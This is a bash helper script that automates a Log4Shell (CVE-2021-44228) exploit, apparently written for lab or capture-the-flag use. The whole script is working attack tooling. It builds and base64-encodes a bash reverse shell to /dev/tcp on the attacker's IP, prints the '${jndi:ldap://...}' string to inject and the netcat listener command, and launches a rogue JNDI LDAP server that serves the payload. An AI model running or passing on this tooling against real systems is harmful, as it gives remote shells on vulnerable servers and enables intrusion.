#!/bin/bash
#
# rogue-jndi-helper.sh
#
# Wraps the common (and error-prone) setup steps for a Log4Shell (CVE-2021-44228)
# rogue-jndi + reverse shell listener, so you don't repeat the port-mismatch and
# corrupted-base64 mistakes that are extremely easy to make manually.
#
# Usage:
#   ./rogue-jndi-helper.sh <your_tun0_ip> <shell_callback_port> <ldap_port>
#
# Example:
#   ./rogue-jndi-helper.sh 10.10.15.59 1337 1389
#
# Requires: rogue-jndi already built (target/RogueJndi-1.1.jar present in cwd),
# base64, netcat.

set -euo pipefail

if [[ $# -ne 3 ]]; then
    echo "Usage: $0 <your_tun0_ip> <shell_callback_port> <ldap_port>"
    exit 1
fi

ATTACKER_IP="$1"
SHELL_PORT="$2"
LDAP_PORT="$3"

if [[ ! -f "target/RogueJndi-1.1.jar" ]]; then
    echo "[!] target/RogueJndi-1.1.jar not found. Build it first with: mvn package"
    exit 1
fi

# Build and sanity-check the base64 payload BEFORE using it, to catch the exact
# "corrupted payload" mistake that's easy to make when copy-pasting.
RAW_CMD="bash -c bash -i >&/dev/tcp/${ATTACKER_IP}/${SHELL_PORT} 0>&1"
B64_CMD=$(echo -n "$RAW_CMD" | base64 -w0)

echo "[*] Raw reverse shell command: $RAW_CMD"
echo "[*] Base64 encoded:            $B64_CMD"
echo "[*] Sanity check (decoded):    $(echo "$B64_CMD" | base64 -d)"
echo

if [[ "$(echo "$B64_CMD" | base64 -d)" != "$RAW_CMD" ]]; then
    echo "[!] Base64 sanity check FAILED — decoded payload does not match original. Aborting."
    exit 1
fi

echo "[*] Launching rogue-jndi on port ${LDAP_PORT}, hostname=${ATTACKER_IP} ..."
echo "[*] Remember: start your netcat listener on port ${SHELL_PORT} in another terminal:"
echo "        nc -nlvp ${SHELL_PORT}"
echo
echo "[*] JNDI payload to inject:"
echo "        \${jndi:ldap://${ATTACKER_IP}:${LDAP_PORT}/o=tomcat}"
echo

java -jar target/RogueJndi-1.1.jar \
    --command "bash -c {echo,${B64_CMD}}|{base64,-d}|{bash,-i}" \
    --hostname "${ATTACKER_IP}"
